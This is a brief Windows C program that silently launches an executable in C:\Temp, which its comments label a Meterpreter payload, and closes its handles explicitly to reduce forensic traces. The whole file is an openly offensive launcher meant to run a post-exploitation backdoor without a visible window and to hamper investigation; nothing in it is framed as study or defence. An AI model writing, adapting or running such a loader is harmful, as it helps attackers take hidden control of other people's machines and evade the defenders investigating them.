#include <windows.h>

int main() {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;  // Hide the process window

    ZeroMemory(&pi, sizeof(pi));

    // Run Meterpreter payload from C:\Temp
    if (!CreateProcess("C:\\Temp\\changethis.exe", NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        return 1;  // Exit if execution fails
    }

    // Close handles to reduce forensic traces
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0;
}
